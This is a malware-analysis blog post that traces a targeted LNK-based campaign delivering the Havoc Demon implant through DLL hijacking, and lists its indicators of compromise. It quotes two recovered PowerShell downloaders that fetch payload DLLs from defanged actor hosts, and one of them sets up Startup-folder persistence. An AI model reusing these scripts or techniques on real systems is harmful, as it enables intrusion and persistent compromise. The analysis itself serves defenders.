<!doctype html><html lang="en" data-mode="dark"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7"><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" ><meta name="generator" content="Jekyll v4.3.4" /><meta property="og:title" content="Targeted Campaign Delivering Havoc" /><meta property="og:locale" content="en" /><meta name="description" content="On January 15, 2025, a file named DH-Report76.pdf.lnk was uploaded to VirusTotal. The LNK file was likely being delivered to victims from army-mil[.]zapto.org." /><meta property="og:description" content="On January 15, 2025, a file named DH-Report76.pdf.lnk was uploaded to VirusTotal. The LNK file was likely being delivered to victims from army-mil[.]zapto.org." /><link rel="canonical" href="https://dmpdump.github.io/posts/Havoc/" /><meta property="og:url" content="https://dmpdump.github.io/posts/Havoc/" /><meta property="og:site_name" content="dmpdump" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2025-01-16T00:00:00+00:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Targeted Campaign Delivering Havoc" /><meta name="twitter:site" content="@G60930953" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-01-18T20:10:58+00:00","datePublished":"2025-01-16T00:00:00+00:00","description":"On January 15, 2025, a file named DH-Report76.pdf.lnk was uploaded to VirusTotal. The LNK file was likely being delivered to victims from army-mil[.]zapto.org.","headline":"Targeted Campaign Delivering Havoc","mainEntityOfPage":{"@type":"WebPage","@id":"https://dmpdump.github.io/posts/Havoc/"},"url":"https://dmpdump.github.io/posts/Havoc/"}</script><title>Targeted Campaign Delivering Havoc | dmpdump</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="dmpdump"><meta name="application-name" content="dmpdump"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.6.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.29.0/dist/tocbot.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css"><body><aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end"><header class="profile-wrapper"> <a href="/" id="avatar" class="rounded-circle"><img src="/assets/images/avatar.png" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a><h1 class="site-title"> <a href="/">dmpdump</a></h1><p class="site-subtitle fst-italic mb-0">CTI, RE, Programming</p></header><nav class="flex-column flex-grow-1 w-100 ps-0"><ul class="nav"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle"></i> <span>ABOUT</span> </a></ul></nav><div class="sidebar-bottom d-flex flex-wrap align-items-center w-100"> <a href="https://github.com/dmpdump" aria-label="github" target="_blank" rel="noopener noreferrer" > <i class="fab fa-github"></i> </a> <a href="https://twitter.com/G60930953" aria-label="twitter" target="_blank" rel="noopener noreferrer" > <i class="fa-brands fa-x-twitter"></i> </a> <a href="javascript:location.href = 'mailto:' + ['dmpdump','tuta.io'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></aside><div id="main-wrapper" class="d-flex justify-content-center"><div class="container d-flex flex-column px-xxl-5"><header id="topbar-wrapper" aria-label="Top Bar"><div id="topbar" class="d-flex align-items-center justify-content-between px-lg-3 h-100" ><nav id="breadcrumb" aria-label="Breadcrumb"> <span> <a href="/">Home</a> </span> <span>Targeted Campaign Delivering Havoc</span></nav><button type="button" id="sidebar-trigger" class="btn btn-link"> <i class="fas fa-bars fa-fw"></i> </button><div id="topbar-title"> Post</div><button type="button" id="search-trigger" class="btn btn-link"> <i class="fas fa-search fa-fw"></i> </button> <search id="search" class="align-items-center ms-3 ms-lg-0"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..." > </search> <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button></div></header><div class="row flex-grow-1"><main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4"><article class="px-1"><header><h1 data-toc-skip>Targeted Campaign Delivering Havoc</h1><div class="post-meta text-muted"> <span> Posted <time data-ts="1736985600" data-df="ll" data-bs-toggle="tooltip" data-bs-placement="bottom" > Jan 16, 2025 </time> </span> <span> Updated <time data-ts="1737231058" data-df="ll" data-bs-toggle="tooltip" data-bs-placement="bottom" > Jan 18, 2025 </time> </span><div class="d-flex justify-content-between"> <span> By <em> <a href="https://github.com/dmpdump">dmpdump</a> </em> </span><div> <span class="readtime" data-bs-toggle="tooltip" data-bs-placement="bottom" title="619 words" > <em>3 min</em> read</span></div></div></div></header><div class="content"><p>On January 15, 2025, a file named DH-Report76.pdf.lnk was uploaded to VirusTotal. The LNK file was likely being delivered to victims from <code class="language-plaintext highlighter-rouge">army-mil[.]zapto.org</code>.</p><p><a href="/assets/images/havoc/lnkdelivery.png" class="popup img-link shimmer"><img src="/assets/images/havoc/lnkdelivery.png" alt="sshot" loading="lazy"></a></p><p>Parsing the LNK file, we can see that it runs a PowerShell downloader that gets a PowerShell script from <code class="language-plaintext highlighter-rouge">army-mil.b-cdn[.]net</code>, using the Bunny Content Delivery Network.</p><p><a href="/assets/images/havoc/psdownloader.png" class="popup img-link shimmer"><img src="/assets/images/havoc/psdownloader.png" alt="sshot" loading="lazy"></a></p><p>Looking at the metadata, we can see that the LNK file was created on a machine named <code class="language-plaintext highlighter-rouge">kasperskys</code>, likely on December 18, 2024.</p><p><a href="/assets/images/havoc/lnkmeta.png" class="popup img-link shimmer"><img src="/assets/images/havoc/lnkmeta.png" alt="sshot" loading="lazy"></a></p><p>The PowerShell script performs the following actions:</p><ul><li>It downloads an encrypted payload named <code class="language-plaintext highlighter-rouge">onelog.dll</code><li>It downloads <code class="language-plaintext highlighter-rouge">sppc.dll</code>, a loader DLL<li>It copies the legitimate <code class="language-plaintext highlighter-rouge">phoneactivate.exe</code> to \AppData\Local\, renaming it to “word.exe”<li>It creates an LNK for persistent execution of the renamed <code class="language-plaintext highlighter-rouge">phoneactivate.exe</code> via the Startup folder</ul><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre><span class="nv">$url2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'army-mil.b-cdn[.]net/onelog.dll'</span><span class="p">;</span><span class="w">
</span><span class="nv">$url3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'army-mil.b-cdn[.]net/sppc.dll'</span><span class="p">;</span><span class="w">
</span><span class="nv">$source</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"C:\Windows\System32\phoneactivate.exe"</span><span class="p">;</span><span class="w">
</span><span class="nv">$destination</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Join-Path</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="s2">"C:\Users\</span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">USERNAME</span><span class="s2">\AppData\Local"</span><span class="w"> </span><span class="nt">-ChildPath</span><span class="w"> </span><span class="s2">"word.exe"</span><span class="p">;</span><span class="w">
</span><span class="nv">$outputPath2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Join-Path</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="s2">"C:\Users\</span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">USERNAME</span><span class="s2">\AppData\Local"</span><span class="w"> </span><span class="nt">-ChildPath</span><span class="w"> </span><span class="s2">"onelog.dll"</span><span class="p">;</span><span class="w">
</span><span class="nv">$outputPath3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Join-Path</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="s2">"C:\Users\</span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">USERNAME</span><span class="s2">\AppData\Local"</span><span class="w"> </span><span class="nt">-ChildPath</span><span class="w"> </span><span class="s2">"sppc.dll"</span><span class="p">;</span><span class="w">
</span><span class="n">Invoke-WebRequest</span><span class="w"> </span><span class="nt">-Uri</span><span class="w"> </span><span class="nv">$url2</span><span class="w"> </span><span class="nt">-OutFile</span><span class="w"> </span><span class="nv">$outputPath2</span><span class="p">;</span><span class="w">
</span><span class="n">Invoke-WebRequest</span><span class="w"> </span><span class="nt">-Uri</span><span class="w"> </span><span class="nv">$url3</span><span class="w"> </span><span class="nt">-OutFile</span><span class="w"> </span><span class="nv">$outputPath3</span><span class="p">;</span><span class="w">
</span><span class="n">Copy-Item</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nv">$source</span><span class="w"> </span><span class="nt">-Destination</span><span class="w"> </span><span class="nv">$destination</span><span class="p">;</span><span class="w">
</span><span class="n">Start-Process</span><span class="w"> </span><span class="nt">-FilePath</span><span class="w"> </span><span class="nv">$destination</span><span class="w"> </span><span class="nt">-WorkingDirectory</span><span class="w"> </span><span class="s2">"</span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">TEMP</span><span class="s2">"</span><span class="p">;</span><span class="w">
</span><span class="nv">$ShortcutPath</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"C:\Users\</span><span class="si">$(</span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">USERNAME</span><span class="si">)</span><span class="s2">\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\edge.lnk"</span><span class="p">;</span><span class="w">
</span><span class="nv">$TargetPath</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"C:\Users\</span><span class="si">$(</span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">USERNAME</span><span class="si">)</span><span class="s2">\AppData\Local\word.exe"</span><span class="p">;</span><span class="w">
</span><span class="nv">$WorkingDirectory</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"C:\Users\</span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">USERNAME</span><span class="s2">\AppData\Local"</span><span class="p">;</span><span class="w">
</span><span class="nv">$WshShell</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nt">-ComObject</span><span class="w"> </span><span class="nx">WScript.Shell</span><span class="p">;</span><span class="w">
</span><span class="nv">$Shortcut</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$WshShell</span><span class="o">.</span><span class="nf">CreateShortcut</span><span class="p">(</span><span class="nv">$ShortcutPath</span><span class="p">);</span><span class="w">
</span><span class="nv">$Shortcut</span><span class="o">.</span><span class="nf">TargetPath</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$TargetPath</span><span class="p">;</span><span class="w">
</span><span class="nv">$Shortcut</span><span class="o">.</span><span class="nf">WorkingDirectory</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$WorkingDirectory</span><span class="p">;</span><span class="w">
</span><span class="nv">$Shortcut</span><span class="o">.</span><span class="nf">Save</span><span class="p">()</span><span class="w">

</span></pre></table></code></div></div><p>The malicious <code class="language-plaintext highlighter-rouge">sppc.dll</code> is used for DLL hijacking. This DLL is loaded by the legitimate <code class="language-plaintext highlighter-rouge">phoneactivate.exe</code>. This DLL decrypts a shellcode loader and the next stage DLL from <code class="language-plaintext highlighter-rouge">onelog.dll</code>.</p><p><a href="/assets/images/havoc/onelog.png" class="popup img-link shimmer"><img src="/assets/images/havoc/onelog.png" alt="sshot" loading="lazy"></a></p><p><code class="language-plaintext highlighter-rouge">sppc.dll</code> uses the undocumented <code class="language-plaintext highlighter-rouge">SystemFunction033</code> NTAPI for RC4 decryption. The key used for the payload decryption is <code class="language-plaintext highlighter-rouge">nbmavjzjlsbpixbddwqqmkqrdejdihrq</code>.</p><p><a href="/assets/images/havoc/readencpload.png" class="popup img-link shimmer"><img src="/assets/images/havoc/readencpload.png" alt="sshot" loading="lazy"></a></p><p><a href="/assets/images/havoc/system033.png" class="popup img-link shimmer"><img src="/assets/images/havoc/system033.png" alt="sshot" loading="lazy"></a></p><p>The decrypted <code class="language-plaintext highlighter-rouge">onelog.dll</code> is comprised of a shellcode loader followed by the next stage DLL, which is the final payload.</p><p><a href="/assets/images/havoc/decsc.png" class="popup img-link shimmer"><img src="/assets/images/havoc/decsc.png" alt="sshot" loading="lazy"></a></p><p><a href="/assets/images/havoc/decdll.png" class="popup img-link shimmer"><img src="/assets/images/havoc/decdll.png" alt="sshot" loading="lazy"></a></p><p>The loader shellcode resolves APIs via hashes using an implementation of the djb2 algorithm.</p><p><a href="/assets/images/havoc/scapires.png" class="popup img-link shimmer"><img src="/assets/images/havoc/scapires.png" alt="sshot" loading="lazy"></a></p><p><a href="/assets/images/havoc/djb2impsc.png" class="popup img-link shimmer"><img src="/assets/images/havoc/djb2impsc.png" alt="sshot" loading="lazy"></a></p><h1 id="final-payload-havoc-demon">Final Payload: Havoc Demon</h1><p>The original name of the final DLL payload is <code class="language-plaintext highlighter-rouge">demon.x64.dll</code>, a file name commonly associated with the demons (clients) of the Havoc framework.</p><p><a href="/assets/images/havoc/origdllname.png" class="popup img-link shimmer"><img src="/assets/images/havoc/origdllname.png" alt="sshot" loading="lazy"></a></p><p>The APIs in this DLL are also resolved via the djb2 algorithm, which we can also confirm in the project’s <a href="https://github.com/HavocFramework/Havoc/blob/41a5d45c2b843d19be581a94350c532c1cd7fd49/payloads/DllLdr/Source/Entry.c">source</a>.</p><p>The demon has the following embedded configuration:</p><p><a href="/assets/images/havoc/demonconfig.png" class="popup img-link shimmer"><img src="/assets/images/havoc/demonconfig.png" alt="sshot" loading="lazy"></a></p><h1 id="related-activity">Related activity</h1><p>Trying to figure out if this campaign was related to something already known, I came across some X posts from <a href="https://x.com/JAMESWT_MHT/status/1869724537115541616">@JAMESWT_MHT</a>, <a href="https://x.com/malwrhunterteam/status/1870065851828732282">@malwrhunterteam</a>, and <a href="https://x.com/marsomx_/status/1870059140355084599">@marsomx_</a> where they had found a similar Demon payload (also using a C2 hosted in Alibaba) associated with a campaign possibly targeting Bangladesh using a fraudulent transaction lure.</p><p><a href="/assets/images/havoc/mwht.png" class="popup img-link shimmer"><img src="/assets/images/havoc/mwht.png" alt="sshot" loading="lazy"></a></p><p>Additionally, <a href="https://x.com/StrikeReadyLabs/status/1876284392319963587">@StrikeReadyLabs</a> did fantastic work discovering related activity, possibly targeting Bangladesh, Pakistan, and China. One of the LNK files shared by StrikeReady (136dd864f5772a6567aff34fcbe6f0665b7cc04b2d486004c370f410bee259b1) downloads a PowerShell script likely generated with an LLM:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre><span class="c"># Define URLs</span><span class="w">
</span><span class="nv">$url1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"uat-updates.gateway.ceair.com.81-cn[.]info/sspicli.dll"</span><span class="w">
</span><span class="nv">$url2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"uat-updates.gateway.ceair.com.81-cn[.]info/windowskernel32.dll"</span><span class="w">

</span><span class="c"># Define target folder</span><span class="w">
</span><span class="nv">$targetFolder</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"</span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">LOCALAPPDATA</span><span class="s2">\Microsoft\OneDrive"</span><span class="w">

</span><span class="c"># Ensure target folder exists</span><span class="w">
</span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="o">-not</span><span class="w"> </span><span class="p">(</span><span class="n">Test-Path</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nv">$targetFolder</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="n">New-Item</span><span class="w"> </span><span class="nt">-ItemType</span><span class="w"> </span><span class="nx">Directory</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nv">$targetFolder</span><span class="w"> </span><span class="nt">-Force</span><span class="w">
</span><span class="p">}</span><span class="w">

</span><span class="c"># Define file paths</span><span class="w">
</span><span class="nv">$file1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Join-Path</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nv">$targetFolder</span><span class="w"> </span><span class="nt">-ChildPath</span><span class="w"> </span><span class="s2">"sspicli.dll"</span><span class="w">
</span><span class="nv">$file2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Join-Path</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nv">$targetFolder</span><span class="w"> </span><span class="nt">-ChildPath</span><span class="w"> </span><span class="s2">"windowskernel32.dll"</span><span class="w">

</span><span class="c"># Download the files</span><span class="w">
</span><span class="n">Invoke-WebRequest</span><span class="w"> </span><span class="nt">-Uri</span><span class="w"> </span><span class="nv">$url1</span><span class="w"> </span><span class="nt">-OutFile</span><span class="w"> </span><span class="nv">$file1</span><span class="w">
</span><span class="n">Invoke-WebRequest</span><span class="w"> </span><span class="nt">-Uri</span><span class="w"> </span><span class="nv">$url2</span><span class="w"> </span><span class="nt">-OutFile</span><span class="w"> </span><span class="nv">$file2</span><span class="w">

</span><span class="n">Write-Host</span><span class="w"> </span><span class="s2">"Files downloaded successfully to </span><span class="nv">$targetFolder</span><span class="s2">"</span><span class="w">
</span></pre></table></code></div></div><p>The files downloaded by the script are <code class="language-plaintext highlighter-rouge">sspicli.dll</code>, a payload decryptor, (7498a07f903486473cce83fbf16b88009765af98326e1ebef4c48f103b874f65) and <code class="language-plaintext highlighter-rouge">windowskernel32.dll</code>, the encrypted payload (90f43a20a956b5d2e7b73cd3c2a6896a3af032414a297a23d0f07ef2f1016b17). Interestingly, in this activity the threat actor did not download an executable for the DLL hijacking. Instead, they saved the trojanized DLL and encrypted payload to the OneDrive folder, so that the payload is loaded by OneDrive.exe.</p><p><code class="language-plaintext highlighter-rouge">sspicli.dll</code> is a similar RC4 decryptor/loader for a Havoc demon that uses Cloudflare Workers for the C2.</p><p><a href="/assets/images/havoc/strikedec.png" class="popup img-link shimmer"><img src="/assets/images/havoc/strikedec.png" alt="sshot" loading="lazy"></a></p><p><a href="/assets/images/havoc/strikeconfig.png" class="popup img-link shimmer"><img src="/assets/images/havoc/strikeconfig.png" alt="sshot" loading="lazy"></a></p><h1 id="iocs">IOCs</h1><ul><li>Delivery domain 1: army-mil[.]zapto.org<li>Delivery domain 2: army-mil.b-cdn[.]net<li>DH-Report76.pdf.lnk: 207b27f4f17802dc951b6300eaeeaed181ee7567526325f940e66242f54d3add<li>f.ps1: 03dc626901d475bed1118e04a53405000b082180d5cd5d1105c1180432cf0c23<li>Onelog.dll: 2a09b5f1429eb2b6049e374200cb39d7075dd962098adb6b61b0bafbcee9b487<li>sppc.dll decryptor/loader: fe3659fe8ceedc9acbd84eca852f06feeb235e9fe83fa6da2383d17f6e0108c5<li>Demon C2: 47.250.118[.]131</ul></div><div class="post-tail-wrapper text-muted"><div class="post-tags"> <i class="fa fa-tags fa-fw me-1"></i> <a href="/tags/malware/" class="post-tag no-text-decoration" >malware</a> <a href="/tags/havoc/" class="post-tag no-text-decoration" >havoc</a></div><div class=" post-tail-bottom d-flex justify-content-between align-items-center mt-5 pb-2 " ><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper d-flex align-items-center"> <span class="share-label text-muted">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Targeted%20Campaign%20Delivering%20Havoc%20-%20dmpdump&url=https%3A%2F%2Fdmpdump.github.io%2Fposts%2FHavoc%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter"> <i class="fa-fw fa-brands fa-square-x-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Targeted%20Campaign%20Delivering%20Havoc%20-%20dmpdump&u=https%3A%2F%2Fdmpdump.github.io%2Fposts%2FHavoc%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fdmpdump.github.io%2Fposts%2FHavoc%2F&text=Targeted%20Campaign%20Delivering%20Havoc%20-%20dmpdump" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <button id="copy-link" aria-label="Copy link" class="btn small" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy link" data-title-succeed="Link copied successfully!" > <i class="fa-fw fas fa-link pe-none fs-6"></i> </button> </span></div></div></div></article></main><aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 mb-5 text-muted"><div class="access"><section id="access-lastmod"><h2 class="panel-heading">Recently Updated</h2><ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2"><li class="text-truncate lh-lg"> <a href="/posts/Havoc/">Targeted Campaign Delivering Havoc</a><li class="text-truncate lh-lg"> <a href="/posts/NorthKorea_Backdoor_Stealer/">North Korea-nexus Golang Backdoor/Stealer from Contagious Interview campaign</a><li class="text-truncate lh-lg"> <a href="/posts/TrojanizedChromeExtensions/">Trojanized Chrome Extensions</a><li class="text-truncate lh-lg"> <a href="/posts/KoiLoader/">KoiLoader/KoiStealer</a><li class="text-truncate lh-lg"> <a href="/posts/PUBLOAD_GrimResource/">PUBLOAD Likely Delivered to Thailand via GrimResource MSC</a></ul></section><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/tags/malware/">malware</a> <a class="post-tag btn btn-outline-primary" href="/tags/chrome/">chrome</a> <a class="post-tag btn btn-outline-primary" href="/tags/re/">RE</a> <a class="post-tag btn btn-outline-primary" href="/tags/cti/">CTI</a> <a class="post-tag btn btn-outline-primary" href="/tags/golang/">golang</a> <a class="post-tag btn btn-outline-primary" href="/tags/havoc/">havoc</a></div></section></div></aside></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4"><aside id="related-posts" aria-labelledby="related-label"><h3 class="mb-4" id="related-label">Further Reading</h3><nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4"><article class="col"> <a href="/posts/NorthKorea_Backdoor_Stealer/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1736035200" data-df="ll" > Jan 5, 2025 </time><h4 class="pt-0 my-2">North Korea-nexus Golang Backdoor/Stealer from Contagious Interview campaign</h4><div class="text-muted"><p>On December 28, 2024, @tayvano_ shared a great thread on X describing activity consistent with what is typically known as the “Contagious Interview” campaign conducted by North Korea-nexus threat a...</p></div></div></a></article><article class="col"> <a href="/posts/TrojanizedChromeExtensions/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1735430400" data-df="ll" > Dec 29, 2024 </time><h4 class="pt-0 my-2">Trojanized Chrome Extensions</h4><div class="text-muted"><p>I rarely deal with malicious browser extensions, however, they are likely to become increasingly relevant in the future. It is commonly said that “the browser is the new OS”, so it only makes sense...</p></div></div></a></article><article class="col"> <a href="/posts/PUBLOAD_GrimResource/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1735257600" data-df="ll" > Dec 27, 2024 </time><h4 class="pt-0 my-2">PUBLOAD Likely Delivered to Thailand via GrimResource MSC</h4><div class="text-muted"><p>On December 20, 2024, a Microsoft Management Console (MSC) file named “Invitation Letter.msc” was uploaded from Thailand to VirusTotal. File name: Invitation Letter.msc Hash: 5b18f8b379cb3294...</p></div></div></a></article></nav></aside><nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation"> <a href="/posts/NorthKorea_Backdoor_Stealer/" class="btn btn-outline-primary" aria-label="Older" ><p>North Korea-nexus Golang Backdoor/Stealer from Contagious Interview campaign</p></a><div class="btn btn-outline-primary disabled" aria-label="Newer"><p>-</p></div></nav><footer aria-label="Site Info" class=" d-flex flex-column justify-content-center text-muted flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3 " ><p>© <time>2025</time> <a href="https://github.com/dmpdump">dmpdump</a>. <span data-bs-toggle="tooltip" data-bs-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author." >Some rights reserved.</span></p><p>Using the <a data-bs-toggle="tooltip" data-bs-placement="top" title="v7.1.0" href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener" >Chirpy</a> theme for <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>.</p></footer></div></div><div id="search-result-wrapper" class="d-flex justify-content-center d-none"><div class="col-11 content"><div id="search-hints"><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/tags/malware/">malware</a> <a class="post-tag btn btn-outline-primary" href="/tags/chrome/">chrome</a> <a class="post-tag btn btn-outline-primary" href="/tags/re/">RE</a> <a class="post-tag btn btn-outline-primary" href="/tags/cti/">CTI</a> <a class="post-tag btn btn-outline-primary" href="/tags/golang/">golang</a> <a class="post-tag btn btn-outline-primary" href="/tags/havoc/">havoc</a></div></section></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><aside aria-label="Scroll to Top"> <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow"> <i class="fas fa-angle-up"></i> </button></aside></div><div id="mask"></div><aside id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-bs-animation="true" data-bs-autohide="false" ><div class="toast-header"> <button type="button" class="btn-close ms-auto" data-bs-dismiss="toast" aria-label="Close" ></button></div><div class="toast-body text-center pt-0"><p class="px-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></aside><script src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/glightbox@3.3.0/dist/js/glightbox.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.13/dayjs.min.js,npm/dayjs@1.11.13/locale/en.js,npm/dayjs@1.11.13/plugin/relativeTime.js,npm/dayjs@1.11.13/plugin/localizedFormat.js"></script> <script src="/assets/js/dist/post.min.js"></script> <script defer src="/app.min.js"></script> <script>SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<article class="px-1 px-sm-2 px-lg-4 px-xl-0"><header><h2><a href="{url}">{title}</a></h2><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div></header><p>{snippet}</p></article>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="me-sm-4"><i class="far fa-folder 